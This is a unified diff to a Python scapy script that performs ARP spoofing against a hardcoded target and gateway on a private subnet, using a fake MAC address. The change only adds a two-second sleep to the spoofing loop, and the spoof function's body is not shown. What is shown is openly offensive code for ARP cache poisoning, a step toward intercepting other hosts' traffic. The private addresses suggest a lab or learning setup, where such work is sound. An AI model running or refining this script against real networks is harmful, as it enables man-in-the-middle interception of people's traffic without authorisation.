@@ -1,5 +1,6 @@
 import os
 import scapy.all as scapy
+import time
 
 # Check for root privileges
 if not os.geteuid() == 0:
@@ -25,10 +26,9 @@ fake_mac = "de:ad:be:ef:de:ad"  # Fake MAC address
 target_ip = "192.168.122.178"  # IP of the target machine
 gateway_ip = "192.168.122.1"  # IP of the router
 
-
 try:
   while True:
     spoof(target_ip, gateway_ip, fake_mac)
-    # Add any additional actions or conditions here
+    time.sleep(2)  # Add delay to avoid flooding the network
 except KeyboardInterrupt:
   print("\nARP spoofing stopped.")
